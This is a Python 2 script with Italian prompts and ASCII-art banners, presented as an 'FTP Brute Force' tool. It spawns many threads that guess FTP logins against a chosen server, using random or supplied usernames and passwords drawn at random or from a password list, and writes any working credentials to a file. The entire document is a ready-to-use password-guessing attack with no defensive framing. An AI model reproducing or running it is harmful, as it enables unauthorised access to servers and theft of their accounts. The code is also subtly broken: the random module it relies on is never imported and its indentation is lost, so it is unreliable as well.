import string
import ftplib
import os
import threading
import time
from ftplib import FTP
# Run with Python 2.7.5
def clear():
if os.name in ("nt", "dos", "ce"):
os.system('title ........:::::FTP Brute Force v 1.3:::::........ coded by Xordas')
os.system('color a')
os.system('cls')

clear()
print ' .......:::FTP Brute Force v 1.3:::.......'
print " ___________"
print " |.---------.|"
print " @)___||_ ||_______"
print " {8*8888*888{______}spunk ||_______>"
print " @) ||_________||"
print " `----)-(----`"
print " ____[=== o]___"
print " |::::::::::::::|\ "
print " `-============-`()"
time.sleep(0.7)
clear()
print ' .......:::FTP Brute Force v 1.3:::.......'
print ' __ __ _____ _____ _____ ___ _____ '
print ' \ \ / / / _ \ | _ \ | _ \ / | / ___/ '
print ' \ \/ / | | | | | |_| | | | | | / /| | | |___ '
print ' } { | | | | | _ / | | | | / / | | \___ \ '
print ' / /\ \ | |_| | | | \ \ | |_| | / / | | ___| | '
print ' /_/ \_\ \_____/ |_| \_\ |_____/ /_/ |_| /_____/ '
print ""
print " Coded by Xordas."
time.sleep(1.3)
clear()

Max_Win = 800
Lock = threading.Lock()
times = 0

class Bruterforce(threading.Thread):

def __init__(self, server, number):
threading.Thread.__init__(self)
self.srv = server
self.num = number

def run(self):
global Lock
Lock.acquire()
print 'Starting thread #{0}'.format(self.num)
Lock.release()
chars = string.ascii_uppercase + string.ascii_lowercase + string.digits
while True:
try:
ftp_conn = FTP(self.srv)
if username == '':
count_chars = 1
random_username = ''
while count_chars <= random.randint(user_min, user_max):
random_username = random_username + chars[random.randint(0, len(chars) - 1)]
count_chars = count_chars + 1
ftp_username = random_username
else:
ftp_username = username

if pass_list_mode == 0:
count_chars = 1
random_password = ''
while count_chars <= random.randint(pass_min, pass_max):
random_password = random_password + chars[random.randint(0, len(chars) - 1)]
count_chars = count_chars + 1
ftp_password = random_password
elif pass_list_mode == 1:
in_line = in_file.readline()
if in_line == '':
in_file.close()
break
in_line = in_line[:-1] # rnd = random.randrange(0, 2133190, 1)
ftp_password = in_line

try:
ftp_conn = FTP(self.srv)
print '> Sto Provando Username: ' + ftp_username + '\t\tPassword :\t' + ftp_password + ''
except ftplib.all_errors:
print '> Connessione al server rifiutata...\n'
pass
try:
ftp_conn.login(ftp_username, ftp_password)
except ftplib.all_errors:
pass
else:
print 'Ho trovato i dati!\nUsername: ' + ftp_username + '\nPassword: ' + ftp_password + '\nserver: ' + self.srv + '\n'
null = raw_input("\nPremere invio per uscire e salvare i dati raccolti: ")
out_file = open("Output.txt", "w")
out_file.write('Username: ' + ftp_username + '\nPassword: ' + ftp_password + '\nserver: ' + self.srv + '\n')
out_file.close()
break
ftp_conn.close()
del ftp_conn
except:
print '> Connessione al server rifiutata...\n'
pass

Lock.acquire()
print 'Closing thread #{0}'.format(self.num)
Lock.release()


if __name__ == '__main__':
################################################################
x = 1
while x == 1:
server = raw_input("> Inserisci l'indirizzo del server ex. lol.com : ")
try:
print "> Mi sto connettendo all'host. . ."
ftp_conn = FTP(server)
print "> Accesso consentito"
x = 0
except ftplib.all_errors:
print '> Connessione a ' + server + ' fallita!\n'


num_threads = input("> Inserisci il numero di threads: ")
username = raw_input("\n> Inserisci l'username del login oppure, premi invio per randomizzare: ")

if username == '':
user_min = input("\n> Inserisci la lunghezza minima dell'username: ")
user_max = input("> Inserisci la lunghezza massima dell'username: ")

pass_list_mode = input("\n> Digita '1' per utilizzare una lista password oppure '0' per randomizzare: ")

if pass_list_mode == 0:
pass_min = input("\n> Inserisci la lunghezza minima della password: ")
pass_max = input("> Inserisci la lunghezza massima della password: ")
elif pass_list_mode == 1:
lista = raw_input("> Trascina qui il file password_list.txt e premi invio: ")
in_file = open(lista,"r")

###################################################################

for i in xrange(num_threads):
Bruterforce(server, i + 1).start()
			
